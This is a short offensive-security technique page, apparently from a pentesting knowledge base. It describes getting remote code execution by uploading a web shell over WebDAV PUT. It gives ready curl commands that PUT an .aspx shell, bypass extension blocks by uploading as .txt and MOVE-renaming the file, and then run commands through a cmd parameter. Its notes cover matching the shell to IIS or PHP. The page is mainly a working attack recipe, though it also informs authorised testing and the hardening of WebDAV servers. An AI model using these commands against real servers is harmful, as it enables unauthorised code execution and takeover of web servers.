---
title: "PUT upload to RCE: uploading a web shell over WebDAV"
description: "Abusing the WebDAV PUT method to upload an executable file into a web-served, script-enabled directory for code execution, including using MOVE to rename a disallowed extension to an executable one when PUT of that extension is blocked."
keywords:
  - WebDAV PUT
  - web shell upload
  - MOVE rename
  - RCE
  - IIS WebDAV
---

# PUT upload to RCE

The WebDAV PUT method writes a file to the server. Where the target directory is web-served and allowed to execute scripts, PUT-ing a web shell in the server's language and then requesting it yields code execution. Where PUT of an executable extension is blocked, uploading a benign extension and then MOVE-ing it to an executable one is the standard bypass.

```bash
# Direct PUT of a web shell (if the extension is allowed and executable)
curl -X PUT http://<target>/dav/shell.aspx --data-binary @shell.aspx
# Blocked extension? upload as .txt, then MOVE to .aspx
curl -X PUT http://<target>/dav/s.txt --data-binary @shell.aspx
curl -X MOVE http://<target>/dav/s.txt -H 'Destination: http://<target>/dav/s.aspx'
curl 'http://<target>/dav/s.aspx?cmd=whoami'
```

## Exploitation notes

- Match the shell to the platform: `.aspx` for IIS, `.php` for PHP-enabled Apache DAV; the directory must execute that type.
- The MOVE-rename bypass defeats extension allowlists on PUT, a classic IIS WebDAV technique.
- Confirm the uploaded file's URL and that the directory executes scripts; a DAV directory that only stores files yields upload but not execution.

## References

- [HackTricks: PUT method and WebDAV](https://book.hacktricks.wiki/en/network-services-pentesting/put-method-webdav.html)
- [PayloadsAllTheThings: upload insecure files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
